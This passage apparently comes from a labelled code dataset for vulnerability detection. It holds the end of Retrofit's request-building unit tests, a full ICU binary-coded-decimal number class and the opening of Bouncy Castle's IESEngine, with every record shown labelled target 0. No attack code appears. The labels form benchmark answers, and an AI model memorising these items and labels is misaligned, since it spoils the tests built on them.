fields, @Field(\"kit\") String kit) {\n        return null;\n      }\n    }\n\n    List<Object> values = Arrays.<Object>asList(\"foo\", \"bar\", null, 3);\n    Request request = buildRequest(Example.class, values, \"kat\");\n    assertBody(request.body(), \"foo=foo&foo=bar&foo=3&kit=kat\");\n  }\n\n  @Test public void formEncodedFieldArray() {\n    class Example {\n      @FormUrlEncoded //\n      @POST(\"/foo\") //\n      Call<ResponseBody> method(@Field(\"foo\") Object[] fields, @Field(\"kit\") String kit) {\n        return null;\n      }\n    }\n\n    Object[] values = { 1, 2, null, \"three\" };\n    Request request = buildRequest(Example.class, values, \"kat\");\n    assertBody(request.body(), \"foo=1&foo=2&foo=three&kit=kat\");\n  }\n\n  @Test public void formEncodedFieldPrimitiveArray() {\n    class Example {\n      @FormUrlEncoded //\n      @POST(\"/foo\") //\n      Call<ResponseBody> method(@Field(\"foo\") int[] fields, @Field(\"kit\") String kit) {\n        return null;\n      }\n    }\n\n    int[] values = { 1, 2, 3 };\n    Request request = buildRequest(Example.class, values, \"kat\");\n    assertBody(request.body(), \"foo=1&foo=2&foo=3&kit=kat\");\n  }\n\n  @Test public void formEncodedWithEncodedNameFieldParamMap() {\n    class Example {\n      @FormUrlEncoded //\n      @POST(\"/foo\") //\n      Call<ResponseBody> method(@FieldMap(encoded = true) Map<String, Object> fieldMap) {\n        return null;\n      }\n    }\n\n    Map<String, Object> fieldMap = new LinkedHashMap<>();\n    fieldMap.put(\"k%20it\", \"k%20at\");\n    fieldMap.put(\"pin%20g\", \"po%20ng\");\n\n    Request request = buildRequest(Example.class, fieldMap);\n    assertBody(request.body(), \"k%20it=k%20at&pin%20g=po%20ng\");\n  }\n\n  @Test public void formEncodedFieldMap() {\n    class Example {\n      @FormUrlEncoded //\n      @POST(\"/foo\") //\n      Call<ResponseBody> method(@FieldMap Map<String, Object> fieldMap) {\n        return null;\n      }\n    }\n\n    Map<String, Object> fieldMap = new LinkedHashMap<>();\n    fieldMap.put(\"kit\", \"kat\");\n    fieldMap.put(\"ping\", \"pong\");\n\n    Request request = buildRequest(Example.class, fieldMap);\n    assertBody(request.body(), \"kit=kat&ping=pong\");\n  }\n\n  @Test public void fieldMapRejectsNull() {\n    class Example {\n      @FormUrlEncoded //\n      @POST(\"/\") //\n      Call<ResponseBody> method(@FieldMap Map<String, Object> a) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, new Object[] { null });\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Field map was null.\");\n    }\n  }\n\n  @Test public void fieldMapRejectsNullKeys() {\n    class Example {\n      @FormUrlEncoded //\n      @POST(\"/\") //\n      Call<ResponseBody> method(@FieldMap Map<String, Object> a) {\n        return null;\n      }\n    }\n\n    Map<String, Object> fieldMap = new LinkedHashMap<>();\n    fieldMap.put(\"kit\", \"kat\");\n    fieldMap.put(null, \"pong\");\n\n    try {\n      buildRequest(Example.class, fieldMap);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Field map contained null key.\");\n    }\n  }\n\n  @Test public void fieldMapRejectsNullValues() {\n    class Example {\n      @FormUrlEncoded //\n      @POST(\"/\") //\n      Call<ResponseBody> method(@FieldMap Map<String, Object> a) {\n        return null;\n      }\n    }\n\n    Map<String, Object> fieldMap = new LinkedHashMap<>();\n    fieldMap.put(\"kit\", \"kat\");\n    fieldMap.put(\"foo\", null);\n\n    try {\n      buildRequest(Example.class, fieldMap);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Field map contained null value for key 'foo'.\");\n    }\n  }\n\n  @Test public void fieldMapMustBeAMap() {\n    class Example {\n      @FormUrlEncoded //\n      @POST(\"/\") //\n      Call<ResponseBody> method(@FieldMap List<String> a) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@FieldMap parameter type must be Map. (parameter #1)\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void fieldMapSupportsSubclasses() throws IOException {\n    class Foo extends HashMap<String, String> {\n    }\n\n    class Example {\n      @FormUrlEncoded //\n      @POST(\"/\") //\n      Call<ResponseBody> method(@FieldMap Foo a) {\n        return null;\n      }\n    }\n\n    Foo foo = new Foo();\n    foo.put(\"hello\", \"world\");\n\n    Request request = buildRequest(Example.class, foo);\n    Buffer buffer = new Buffer();\n    request.body().writeTo(buffer);\n    assertThat(buffer.readUtf8()).isEqualTo(\"hello=world\");\n  }\n\n  @Test public void simpleHeaders() {\n    class Example {\n      @GET(\"/foo/bar/\")\n      @Headers({\n          \"ping: pong\",\n          \"kit: kat\"\n      })\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class);\n    assertThat(request.method()).isEqualTo(\"GET\");\n    okhttp3.Headers headers = request.headers();\n    assertThat(headers.size()).isEqualTo(2);\n    assertThat(headers.get(\"ping\")).isEqualTo(\"pong\");\n    assertThat(headers.get(\"kit\")).isEqualTo(\"kat\");\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void headersDoNotOverwriteEachOther() {\n    class Example {\n      @GET(\"/foo/bar/\")\n      @Headers({\n          \"ping: pong\",\n          \"kit: kat\",\n          \"kit: -kat\",\n      })\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class);\n    assertThat(request.method()).isEqualTo(\"GET\");\n    okhttp3.Headers headers = request.headers();\n    assertThat(headers.size()).isEqualTo(3);\n    assertThat(headers.get(\"ping\")).isEqualTo(\"pong\");\n    assertThat(headers.values(\"kit\")).containsOnly(\"kat\", \"-kat\");\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void headerParamToString() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Header(\"kit\") BigInteger kit) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, new BigInteger(\"1234\"));\n    assertThat(request.method()).isEqualTo(\"GET\");\n    okhttp3.Headers headers = request.headers();\n    assertThat(headers.size()).isEqualTo(1);\n    assertThat(headers.get(\"kit\")).isEqualTo(\"1234\");\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void headerParam() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      @Headers(\"ping: pong\") //\n      Call<ResponseBody> method(@Header(\"kit\") String kit) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"kat\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    okhttp3.Headers headers = request.headers();\n    assertThat(headers.size()).isEqualTo(2);\n    assertThat(headers.get(\"ping\")).isEqualTo(\"pong\");\n    assertThat(headers.get(\"kit\")).isEqualTo(\"kat\");\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void headerParamList() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Header(\"foo\") List<String> kit) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, Arrays.asList(\"bar\", null, \"baz\"));\n    assertThat(request.method()).isEqualTo(\"GET\");\n    okhttp3.Headers headers = request.headers();\n    assertThat(headers.size()).isEqualTo(2);\n    assertThat(headers.values(\"foo\")).containsExactly(\"bar\", \"baz\");\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void headerParamArray() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Header(\"foo\") String[] kit) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, (Object) new String[] { \"bar\", null, \"baz\" });\n    assertThat(request.method()).isEqualTo(\"GET\");\n    okhttp3.Headers headers = request.headers();\n    assertThat(headers.size()).isEqualTo(2);\n    assertThat(headers.values(\"foo\")).containsExactly(\"bar\", \"baz\");\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void contentTypeAnnotationHeaderOverrides() {\n    class Example {\n      @POST(\"/\") //\n      @Headers(\"Content-Type: text/not-plain\") //\n      Call<ResponseBody> method(@Body RequestBody body) {\n        return null;\n      }\n    }\n    RequestBody body = RequestBody.create(TEXT_PLAIN, \"hi\");\n    Request request = buildRequest(Example.class, body);\n    assertThat(request.body().contentType().toString()).isEqualTo(\"text/not-plain\");\n  }\n\n  @Test public void malformedContentTypeHeaderThrows() {\n    class Example {\n      @POST(\"/\") //\n      @Headers(\"Content-Type: hello, world!\") //\n      Call<ResponseBody> method(@Body RequestBody body) {\n        return null;\n      }\n    }\n    RequestBody body = RequestBody.create(TEXT_PLAIN, \"hi\");\n    try {\n      buildRequest(Example.class, body);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Malformed content type: hello, world!\\n\"\n          + \"    for method Example.method\");\n      assertThat(e.getCause()).isInstanceOf(IllegalArgumentException.class); // OkHttp's cause.\n    }\n  }\n\n  @Test public void contentTypeAnnotationHeaderAddsHeaderWithNoBody() {\n    class Example {\n      @DELETE(\"/\") //\n      @Headers(\"Content-Type: text/not-plain\") //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class);\n    assertThat(request.headers().get(\"Content-Type\")).isEqualTo(\"text/not-plain\");\n  }\n\n  @Test public void contentTypeParameterHeaderOverrides() {\n    class Example {\n      @POST(\"/\") //\n      Call<ResponseBody> method(@Header(\"Content-Type\") String contentType, @Body RequestBody body) {\n        return null;\n      }\n    }\n    RequestBody body = RequestBody.create(TEXT_PLAIN, \"Plain\");\n    Request request = buildRequest(Example.class, \"text/not-plain\", body);\n    assertThat(request.body().contentType().toString()).isEqualTo(\"text/not-plain\");\n  }\n\n  @Test public void malformedContentTypeParameterThrows() {\n    class Example {\n      @POST(\"/\") //\n      Call<ResponseBody> method(@Header(\"Content-Type\") String contentType, @Body RequestBody body) {\n        return null;\n      }\n    }\n    RequestBody body = RequestBody.create(TEXT_PLAIN, \"hi\");\n    try {\n      buildRequest(Example.class, \"hello, world!\", body);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Malformed content type: hello, world!\");\n      assertThat(e.getCause()).isInstanceOf(IllegalArgumentException.class); // OkHttp's cause.\n    }\n  }\n\n  @Test public void malformedAnnotationRelativeUrlThrows() {\n    class Example {\n      @GET(\"ftp://example.org\")\n      Call<ResponseBody> get() {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"Malformed URL. Base: http://example.com/, Relative: ftp://example.org\");\n    }\n  }\n\n  @Test public void malformedParameterRelativeUrlThrows() {\n    class Example {\n      @GET\n      Call<ResponseBody> get(@Url String relativeUrl) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class, \"ftp://example.org\");\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"Malformed URL. Base: http://example.com/, Relative: ftp://example.org\");\n    }\n  }\n\n  @Test public void multipartPartsShouldBeInOrder() throws IOException {\n    class Example {\n      @Multipart\n      @POST(\"/foo\")\n      Call<ResponseBody> get(@Part(\"first\") String data, @Part(\"second\") String dataTwo, @Part(\"third\") String dataThree) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"firstParam\", \"secondParam\", \"thirdParam\");\n    MultipartBody body = (MultipartBody) request.body();\n\n    Buffer buffer = new Buffer();\n    body.writeTo(buffer);\n    String readBody = buffer.readUtf8();\n\n    assertThat(readBody.indexOf(\"firstParam\")).isLessThan(readBody.indexOf(\"secondParam\"));\n    assertThat(readBody.indexOf(\"secondParam\")).isLessThan(readBody.indexOf(\"thirdParam\"));\n  }\n\n  @Test public void queryParamsSkippedIfConvertedToNull() throws Exception {\n    class Example {\n      @GET(\"/query\") Call<ResponseBody> queryPath(@Query(\"a\") Object a) {\n        return null;\n      }\n    }\n\n    Retrofit.Builder retrofitBuilder = new Retrofit.Builder()\n        .baseUrl(\"http://example.com\")\n        .addConverterFactory(new NullObjectConverterFactory());\n\n    Request request = buildRequest(Example.class, retrofitBuilder, \"Ignored\");\n\n    assertThat(request.url().toString()).doesNotContain(\"Ignored\");\n  }\n\n  @Test public void queryParamMapsConvertedToNullShouldError() throws Exception {\n    class Example {\n      @GET(\"/query\") Call<ResponseBody> queryPath(@QueryMap Map<String, String> a) {\n        return null;\n      }\n    }\n\n    Retrofit.Builder retrofitBuilder = new Retrofit.Builder()\n        .baseUrl(\"http://example.com\")\n        .addConverterFactory(new NullObjectConverterFactory());\n\n    Map<String, String> queryMap = Collections.singletonMap(\"kit\", \"kat\");\n\n    try {\n      buildRequest(Example.class, retrofitBuilder, queryMap);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessageContaining(\n          \"Query map value 'kat' converted to null by retrofit2.helpers.NullObjectConverterFactory$1 for key 'kit'.\");\n    }\n  }\n\n  @Test public void fieldParamsSkippedIfConvertedToNull() throws Exception {\n    class Example {\n      @FormUrlEncoded\n      @POST(\"/query\") Call<ResponseBody> queryPath(@Field(\"a\") Object a) {\n        return null;\n      }\n    }\n\n    Retrofit.Builder retrofitBuilder = new Retrofit.Builder()\n        .baseUrl(\"http://example.com\")\n        .addConverterFactory(new NullObjectConverterFactory());\n\n    Request request = buildRequest(Example.class, retrofitBuilder, \"Ignored\");\n\n    assertThat(request.url().toString()).doesNotContain(\"Ignored\");\n  }\n\n  @Test public void fieldParamMapsConvertedToNullShouldError() throws Exception {\n    class Example {\n      @FormUrlEncoded\n      @POST(\"/query\") Call<ResponseBody> queryPath(@FieldMap Map<String, String> a) {\n        return null;\n      }\n    }\n\n    Retrofit.Builder retrofitBuilder = new Retrofit.Builder()\n        .baseUrl(\"http://example.com\")\n        .addConverterFactory(new NullObjectConverterFactory());\n\n    Map<String, String> queryMap = Collections.singletonMap(\"kit\", \"kat\");\n\n    try {\n      buildRequest(Example.class, retrofitBuilder, queryMap);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessageContaining(\n          \"Field map value 'kat' converted to null by retrofit2.helpers.NullObjectConverterFactory$1 for key 'kit'.\");\n    }\n  }\n\n  private static void assertBody(RequestBody body, String expected) {\n    assertThat(body).isNotNull();\n    Buffer buffer = new Buffer();\n    try {\n      body.writeTo(buffer);\n      assertThat(buffer.readUtf8()).isEqualTo(expected);\n    } catch (IOException e) {\n      throw new RuntimeException(e);\n    }\n  }\n\n  static <T> Request buildRequest(Class<T> cls, Retrofit.Builder builder, Object... args) {\n    okhttp3.Call.Factory callFactory = new okhttp3.Call.Factory() {\n      @Override public okhttp3.Call newCall(Request request) {\n        throw new UnsupportedOperationException(\"Not implemented\");\n      }\n    };\n\n    Retrofit retrofit = builder.callFactory(callFactory).build();\n\n    Method method = TestingUtils.onlyMethod(cls);\n    try {\n      return RequestFactory.parseAnnotations(retrofit, method).create(args);\n    } catch (RuntimeException e) {\n      throw e;\n    } catch (Exception e) {\n      throw new AssertionError(e);\n    }\n  }\n\n  static <T> Request buildRequest(Class<T> cls, Object... args) {\n    Retrofit.Builder retrofitBuilder = new Retrofit.Builder()\n        .baseUrl(\"http://example.com/\")\n        .addConverterFactory(new ToStringConverterFactory());\n\n    return buildRequest(cls, retrofitBuilder, args);\n  }\n\n  static void assertMalformedRequest(Class<?> cls, Object... args) {\n    try {\n      Request request = buildRequest(cls, args);\n      fail(\"expected a malformed request but was \" + request);\n    } catch (IllegalArgumentException expected) {\n    }\n  }\n}\n", "target": 0}
{"idx": 1025, "func": "// © 2017 and later: Unicode, Inc. and others.\n// License & terms of use: http://www.unicode.org/copyright.html#License\npackage com.ibm.icu.impl.number;\n\nimport java.math.BigDecimal;\nimport java.math.BigInteger;\n\n/**\n * A DecimalQuantity with internal storage as a 64-bit BCD, with fallback to a byte array for numbers\n * that don't fit into the standard BCD.\n */\npublic final class DecimalQuantity_DualStorageBCD extends DecimalQuantity_AbstractBCD {\n\n    /**\n     * The BCD of the 16 digits of the number represented by this object. Every 4 bits of the long map to\n     * one digit. For example, the number \"12345\" in BCD is \"0x12345\".\n     *\n     * <p>\n     * Whenever bcd changes internally, {@link #compact()} must be called, except in special cases like\n     * setting the digit to zero.\n     */\n    private byte[] bcdBytes;\n\n    private long bcdLong = 0L;\n\n    private boolean usingBytes = false;\n\n    @Override\n    public int maxRepresentableDigits() {\n        return Integer.MAX_VALUE;\n    }\n\n    public DecimalQuantity_DualStorageBCD() {\n        setBcdToZero();\n        flags = 0;\n    }\n\n    public DecimalQuantity_DualStorageBCD(long input) {\n        setToLong(input);\n    }\n\n    public DecimalQuantity_DualStorageBCD(int input) {\n        setToInt(input);\n    }\n\n    public DecimalQuantity_DualStorageBCD(double input) {\n        setToDouble(input);\n    }\n\n    public DecimalQuantity_DualStorageBCD(BigInteger input) {\n        setToBigInteger(input);\n    }\n\n    public DecimalQuantity_DualStorageBCD(BigDecimal input) {\n        setToBigDecimal(input);\n    }\n\n    public DecimalQuantity_DualStorageBCD(DecimalQuantity_DualStorageBCD other) {\n        copyFrom(other);\n    }\n\n    public DecimalQuantity_DualStorageBCD(Number number) {\n        // NOTE: Number type expansion happens both here\n        // and in NumberFormat.java\n        if (number instanceof Long) {\n            setToLong(number.longValue());\n        } else if (number instanceof Integer) {\n            setToInt(number.intValue());\n        } else if (number instanceof Float) {\n            setToDouble(number.doubleValue());\n        } else if (number instanceof Double) {\n            setToDouble(number.doubleValue());\n        } else if (number instanceof BigInteger) {\n            setToBigInteger((BigInteger) number);\n        } else if (number instanceof BigDecimal) {\n            setToBigDecimal((BigDecimal) number);\n        } else if (number instanceof com.ibm.icu.math.BigDecimal) {\n            setToBigDecimal(((com.ibm.icu.math.BigDecimal) number).toBigDecimal());\n        } else {\n            throw new IllegalArgumentException(\n                    \"Number is of an unsupported type: \" + number.getClass().getName());\n        }\n    }\n\n    @Override\n    public DecimalQuantity createCopy() {\n        return new DecimalQuantity_DualStorageBCD(this);\n    }\n\n    @Override\n    protected byte getDigitPos(int position) {\n        if (usingBytes) {\n            if (position < 0 || position >= precision)\n                return 0;\n            return bcdBytes[position];\n        } else {\n            if (position < 0 || position >= 16)\n                return 0;\n            return (byte) ((bcdLong >>> (position * 4)) & 0xf);\n        }\n    }\n\n    @Override\n    protected void setDigitPos(int position, byte value) {\n        assert position >= 0;\n        if (usingBytes) {\n            ensureCapacity(position + 1);\n            bcdBytes[position] = value;\n        } else if (position >= 16) {\n            switchStorage();\n            ensureCapacity(position + 1);\n            bcdBytes[position] = value;\n        } else {\n            int shift = position * 4;\n            bcdLong = bcdLong & ~(0xfL << shift) | ((long) value << shift);\n        }\n    }\n\n    @Override\n    protected void shiftLeft(int numDigits) {\n        if (!usingBytes && precision + numDigits > 16) {\n            switchStorage();\n        }\n        if (usingBytes) {\n            ensureCapacity(precision + numDigits);\n            int i = precision + numDigits - 1;\n            for (; i >= numDigits; i--) {\n                bcdBytes[i] = bcdBytes[i - numDigits];\n            }\n            for (; i >= 0; i--) {\n                bcdBytes[i] = 0;\n            }\n        } else {\n            bcdLong <<= (numDigits * 4);\n        }\n        scale -= numDigits;\n        precision += numDigits;\n    }\n\n    @Override\n    protected void shiftRight(int numDigits) {\n        if (usingBytes) {\n            int i = 0;\n            for (; i < precision - numDigits; i++) {\n                bcdBytes[i] = bcdBytes[i + numDigits];\n            }\n            for (; i < precision; i++) {\n                bcdBytes[i] = 0;\n            }\n        } else {\n            bcdLong >>>= (numDigits * 4);\n        }\n        scale += numDigits;\n        precision -= numDigits;\n    }\n\n    @Override\n    protected void setBcdToZero() {\n        if (usingBytes) {\n            bcdBytes = null;\n            usingBytes = false;\n        }\n        bcdLong = 0L;\n        scale = 0;\n        precision = 0;\n        isApproximate = false;\n        origDouble = 0;\n        origDelta = 0;\n    }\n\n    @Override\n    protected void readIntToBcd(int n) {\n        assert n != 0;\n        // ints always fit inside the long implementation.\n        long result = 0L;\n        int i = 16;\n        for (; n != 0; n /= 10, i--) {\n            result = (result >>> 4) + (((long) n % 10) << 60);\n        }\n        assert !usingBytes;\n        bcdLong = result >>> (i * 4);\n        scale = 0;\n        precision = 16 - i;\n    }\n\n    @Override\n    protected void readLongToBcd(long n) {\n        assert n != 0;\n        if (n >= 10000000000000000L) {\n            ensureCapacity();\n            int i = 0;\n            for (; n != 0L; n /= 10L, i++) {\n                bcdBytes[i] = (byte) (n % 10);\n            }\n            assert usingBytes;\n            scale = 0;\n            precision = i;\n        } else {\n            long result = 0L;\n            int i = 16;\n            for (; n != 0L; n /= 10L, i--) {\n                result = (result >>> 4) + ((n % 10) << 60);\n            }\n            assert i >= 0;\n            assert !usingBytes;\n            bcdLong = result >>> (i * 4);\n            scale = 0;\n            precision = 16 - i;\n        }\n    }\n\n    @Override\n    protected void readBigIntegerToBcd(BigInteger n) {\n        assert n.signum() != 0;\n        ensureCapacity(); // allocate initial byte array\n        int i = 0;\n        for (; n.signum() != 0; i++) {\n            BigInteger[] temp = n.divideAndRemainder(BigInteger.TEN);\n            ensureCapacity(i + 1);\n            bcdBytes[i] = temp[1].byteValue();\n            n = temp[0];\n        }\n        scale = 0;\n        precision = i;\n    }\n\n    @Override\n    protected BigDecimal bcdToBigDecimal() {\n        if (usingBytes) {\n            // Converting to a string here is faster than doing BigInteger/BigDecimal arithmetic.\n            BigDecimal result = new BigDecimal(toNumberString());\n            if (isNegative()) {\n                result = result.negate();\n            }\n            return result;\n        } else {\n            long tempLong = 0L;\n            for (int shift = (precision - 1); shift >= 0; shift--) {\n                tempLong = tempLong * 10 + getDigitPos(shift);\n            }\n            BigDecimal result = BigDecimal.valueOf(tempLong);\n            try {\n                result = result.scaleByPowerOfTen(scale);\n            } catch (ArithmeticException e) {\n                if (e.getMessage().contains(\"Underflow\")) {\n                    result = BigDecimal.ZERO;\n                } else {\n                    throw e;\n                }\n            }\n            if (isNegative())\n                result = result.negate();\n            return result;\n        }\n    }\n\n    @Override\n    protected void compact() {\n        if (usingBytes) {\n            int delta = 0;\n            for (; delta < precision && bcdBytes[delta] == 0; delta++)\n                ;\n            if (delta == precision) {\n                // Number is zero\n                setBcdToZero();\n                return;\n            } else {\n                // Remove trailing zeros\n                shiftRight(delta);\n            }\n\n            // Compute precision\n            int leading = precision - 1;\n            for (; leading >= 0 && bcdBytes[leading] == 0; leading--)\n                ;\n            precision = leading + 1;\n\n            // Switch storage mechanism if possible\n            if (precision <= 16) {\n                switchStorage();\n            }\n\n        } else {\n            if (bcdLong == 0L) {\n                // Number is zero\n                setBcdToZero();\n                return;\n            }\n\n            // Compact the number (remove trailing zeros)\n            int delta = Long.numberOfTrailingZeros(bcdLong) / 4;\n            bcdLong >>>= delta * 4;\n            scale += delta;\n\n            // Compute precision\n            precision = 16 - (Long.numberOfLeadingZeros(bcdLong) / 4);\n        }\n    }\n\n    /** Ensure that a byte array of at least 40 digits is allocated. */\n    private void ensureCapacity() {\n        ensureCapacity(40);\n    }\n\n    private void ensureCapacity(int capacity) {\n        if (capacity == 0)\n            return;\n        int oldCapacity = usingBytes ? bcdBytes.length : 0;\n        if (!usingBytes) {\n            bcdBytes = new byte[capacity];\n        } else if (oldCapacity < capacity) {\n            byte[] bcd1 = new byte[capacity * 2];\n            System.arraycopy(bcdBytes, 0, bcd1, 0, oldCapacity);\n            bcdBytes = bcd1;\n        }\n        usingBytes = true;\n    }\n\n    /** Switches the internal storage mechanism between the 64-bit long and the byte array. */\n    private void switchStorage() {\n        if (usingBytes) {\n            // Change from bytes to long\n            bcdLong = 0L;\n            for (int i = precision - 1; i >= 0; i--) {\n                bcdLong <<= 4;\n                bcdLong |= bcdBytes[i];\n            }\n            bcdBytes = null;\n            usingBytes = false;\n        } else {\n            // Change from long to bytes\n            ensureCapacity();\n            for (int i = 0; i < precision; i++) {\n                bcdBytes[i] = (byte) (bcdLong & 0xf);\n                bcdLong >>>= 4;\n            }\n            assert usingBytes;\n        }\n    }\n\n    @Override\n    protected void copyBcdFrom(DecimalQuantity _other) {\n        DecimalQuantity_DualStorageBCD other = (DecimalQuantity_DualStorageBCD) _other;\n        setBcdToZero();\n        if (other.usingBytes) {\n            ensureCapacity(other.precision);\n            System.arraycopy(other.bcdBytes, 0, bcdBytes, 0, other.precision);\n        } else {\n            bcdLong = other.bcdLong;\n        }\n    }\n\n    /**\n     * Checks whether the bytes stored in this instance are all valid. For internal unit testing only.\n     *\n     * @return An error message if this instance is invalid, or null if this instance is healthy.\n     * @internal\n     * @deprecated This API is for ICU internal use only.\n     */\n    @Deprecated\n    public String checkHealth() {\n        if (usingBytes) {\n            if (bcdLong != 0)\n                return \"Value in bcdLong but we are in byte mode\";\n            if (precision == 0)\n                return \"Zero precision but we are in byte mode\";\n            if (precision > bcdBytes.length)\n                return \"Precision exceeds length of byte array\";\n            if (getDigitPos(precision - 1) == 0)\n                return \"Most significant digit is zero in byte mode\";\n            if (getDigitPos(0) == 0)\n                return \"Least significant digit is zero in long mode\";\n            for (int i = 0; i < precision; i++) {\n                if (getDigitPos(i) >= 10)\n                    return \"Digit exceeding 10 in byte array\";\n                if (getDigitPos(i) < 0)\n                    return \"Digit below 0 in byte array\";\n            }\n            for (int i = precision; i < bcdBytes.length; i++) {\n                if (getDigitPos(i) != 0)\n                    return \"Nonzero digits outside of range in byte array\";\n            }\n        } else {\n            if (bcdBytes != null) {\n                for (int i = 0; i < bcdBytes.length; i++) {\n                    if (bcdBytes[i] != 0)\n                        return \"Nonzero digits in byte array but we are in long mode\";\n                }\n            }\n            if (precision == 0 && bcdLong != 0)\n                return \"Value in bcdLong even though precision is zero\";\n            if (precision > 16)\n                return \"Precision exceeds length of long\";\n            if (precision != 0 && getDigitPos(precision - 1) == 0)\n                return \"Most significant digit is zero in long mode\";\n            if (precision != 0 && getDigitPos(0) == 0)\n                return \"Least significant digit is zero in long mode\";\n            for (int i = 0; i < precision; i++) {\n                if (getDigitPos(i) >= 10)\n                    return \"Digit exceeding 10 in long\";\n                if (getDigitPos(i) < 0)\n                    return \"Digit below 0 in long (?!)\";\n            }\n            for (int i = precision; i < 16; i++) {\n                if (getDigitPos(i) != 0)\n                    return \"Nonzero digits outside of range in long\";\n            }\n        }\n\n        return null;\n    }\n\n    /**\n     * Checks whether this {@link DecimalQuantity_DualStorageBCD} is using its internal byte array\n     * storage mechanism.\n     *\n     * @return true if an internal byte array is being used; false if a long is being used.\n     * @internal\n     * @deprecated This API is ICU internal only.\n     */\n    @Deprecated\n    public boolean isUsingBytes() {\n        return usingBytes;\n    }\n\n    @Override\n    public String toString() {\n        return String.format(\"<DecimalQuantity %s:%d:%d:%s %s %s%s>\",\n                (lOptPos > 1000 ? \"999\" : String.valueOf(lOptPos)),\n                lReqPos,\n                rReqPos,\n                (rOptPos < -1000 ? \"-999\" : String.valueOf(rOptPos)),\n                (usingBytes ? \"bytes\" : \"long\"),\n                (isNegative() ? \"-\" : \"\"),\n                toNumberString());\n    }\n\n    private String toNumberString() {\n        StringBuilder sb = new StringBuilder();\n        if (usingBytes) {\n            if (precision == 0) {\n                sb.append('0');\n            }\n            for (int i = precision - 1; i >= 0; i--) {\n                sb.append(bcdBytes[i]);\n            }\n        } else {\n            sb.append(Long.toHexString(bcdLong));\n        }\n        sb.append(\"E\");\n        sb.append(scale);\n        return sb.toString();\n    }\n}\n", "target": 0}
{"idx": 1026, "func": "package org.bouncycastle.crypto.engines;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.IOException;\nimport java.math.BigInteger;\n\nimport org.bouncycastle.crypto.BasicAgreement;\nimport org.bouncycastle.crypto.BufferedBlockCipher;\nimport org.bouncycastle.crypto.CipherParameters;\nimport org.bouncycastle.crypto.DerivationFunction;\nimport org.bouncycastle.crypto.EphemeralKeyPair;\nimport org.bouncycastle.crypto.InvalidCipherTextException;\nimport org.bouncycastle.crypto.KeyParser;\nimport org.bouncycastle.crypto.Mac;\nimport org.bouncycastle.crypto.generators.EphemeralKeyPairGenerator;\nimport org.bouncycastle.crypto.params.AsymmetricKeyParameter;\nimport org.bouncycastle.crypto.params.IESParameters;\nimport org.bouncycastle.crypto.params.IESWithCipherParameters;\nimport org.bouncycastle.crypto.params.KDFParameters;\nimport org.bouncycastle.crypto.params.KeyParameter;\nimport org.bouncycastle.crypto.params.ParametersWithIV;\nimport org.bouncycastle.util.Arrays;\nimport org.bouncycastle.util.BigIntegers;\nimport org.bouncycastle.util.Pack;\n\n/**\n * Support class for constructing integrated encryption ciphers\n * for doing basic message exchanges on top of key agreement ciphers.\n * Follows the description given in IEEE Std 1363a.\n */\npublic class IESEngine\n{\n    BasicAgreement agree;\n    DerivationFunction kdf;\n    Mac mac;\n    BufferedBlockCipher cipher;\n    byte[] macBuf;\n\n    boolean forEncryption;\n    CipherParameters privParam, pubParam;\n    IESParameters param;\n\n    byte[] V;\n    private EphemeralKeyPairGenerator keyPairGenerator;\n    private KeyParser keyParser;\n    private byte[] IV;\n\n    /**\n     * set up for use with stream mode, where the key derivation function\n     * is used to provide a stream of bytes to xor with the message.\n     *\n     * @param agree the key agreement used as the basis for the encryption\n     * @param kdf   the key derivation function used for byte generation\n     * @param mac   the message authentication code generator for the message\n     */\n    public IESEngine(\n        BasicAgreement agree,\n        DerivationFunction kdf,\n        Mac mac)\n    {\n        this.agree = agree;\n        this.kdf = kdf;\n        this.mac = mac;\n        this.macBuf = new byte[mac.getMacSize()];\n        this.cipher = 